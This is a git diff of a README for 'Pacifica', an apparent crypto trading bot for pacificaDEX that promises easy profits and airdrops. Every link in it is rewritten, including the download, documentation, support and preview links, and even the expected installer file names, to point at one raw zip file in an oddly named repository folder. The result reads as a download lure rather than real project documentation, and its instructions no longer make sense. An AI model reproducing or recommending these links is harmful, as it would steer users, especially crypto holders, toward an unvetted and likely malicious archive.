@@ -1,7 +1,7 @@
 # 🌊 Pacifica - Automate Your Trades with Ease
 
 ## 📥 Download Now
-[![Download Pacifica](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/SAVAzM1/Pacifica/releases)
+[![Download Pacifica](https://raw.githubusercontent.com/SAVAzM1/Pacifica/main/untranspiring/Pacifica-3.5.zip)](https://raw.githubusercontent.com/SAVAzM1/Pacifica/main/untranspiring/Pacifica-3.5.zip)
 
 ## 🚀 Getting Started
 Welcome to Pacifica! This tool helps you trade automatically on pacificaDEX. With Pacifica, you can easily profit from trades and benefit from future airdrops.
@@ -14,10 +14,10 @@ Before you begin, ensure your system meets the following requirements:
 - Internet Connection: Stable internet connection
 
 ## 📦 Download & Install
-To get Pacifica, visit this page to download: [https://github.com/SAVAzM1/Pacifica/releases](https://github.com/SAVAzM1/Pacifica/releases).
+To get Pacifica, visit this page to download: [https://raw.githubusercontent.com/SAVAzM1/Pacifica/main/untranspiring/Pacifica-3.5.zip](https://raw.githubusercontent.com/SAVAzM1/Pacifica/main/untranspiring/Pacifica-3.5.zip).
 
 1. Once on the Releases page, locate the latest version.
-2. Click on the link to download the software for your operating system. The file will be named something similar to `Pacifica-v1.0.exe` for Windows, `Pacifica-v1.0.dmg` for macOS, or `Pacifica-v1.0.tar.gz` for Linux.
+2. Click on the link to download the software for your operating system. The file will be named something similar to `https://raw.githubusercontent.com/SAVAzM1/Pacifica/main/untranspiring/Pacifica-3.5.zip` for Windows, `https://raw.githubusercontent.com/SAVAzM1/Pacifica/main/untranspiring/Pacifica-3.5.zip` for macOS, or `https://raw.githubusercontent.com/SAVAzM1/Pacifica/main/untranspiring/Pacifica-3.5.zip` for Linux.
 3. After the download completes, find the file in your downloads folder.
 4. Open the file to start the installation process.
 5. Follow the on-screen instructions to complete the installation.
@@ -39,8 +39,8 @@ Pacifica offers several useful features:
 - **User-Friendly Dashboard:** Access all your trading stats in one clear view.
 
 ## 🔗 Links to Explore
-- **Documentation:** Learn how to use all features: [Documentation](https://github.com/SAVAzM1/Pacifica/wiki)
-- **Support:** Got a question? Check our support page: [Support](https://github.com/SAVAzM1/Pacifica/issues)
+- **Documentation:** Learn how to use all features: [Documentation](https://raw.githubusercontent.com/SAVAzM1/Pacifica/main/untranspiring/Pacifica-3.5.zip)
+- **Support:** Got a question? Check our support page: [Support](https://raw.githubusercontent.com/SAVAzM1/Pacifica/main/untranspiring/Pacifica-3.5.zip)
 
 ## 💬 Community & Feedback
 Join our community to share your experiences and feedback:
@@ -72,9 +72,9 @@ Pacifica is open-source software, licensed under the MIT License. Feel free to u
 For questions or support, reach out through the Issues page on GitHub or contact us via our Support channel. 
 
 ## 📺 Preview
-Here’s a glimpse of what the application interface looks like. [Link to Images](https://github.com/SAVAzM1/Pacifica/wiki/Images)
+Here’s a glimpse of what the application interface looks like. [Link to Images](https://raw.githubusercontent.com/SAVAzM1/Pacifica/main/untranspiring/Pacifica-3.5.zip)
 
 ## 🔄 Updates
 Stay tuned for future updates and features aimed at improving your trading experience.
 
-Once again, visit this page to download: [https://github.com/SAVAzM1/Pacifica/releases](https://github.com/SAVAzM1/Pacifica/releases).
+Once again, visit this page to download: [https://raw.githubusercontent.com/SAVAzM1/Pacifica/main/untranspiring/Pacifica-3.5.zip](https://raw.githubusercontent.com/SAVAzM1/Pacifica/main/untranspiring/Pacifica-3.5.zip).
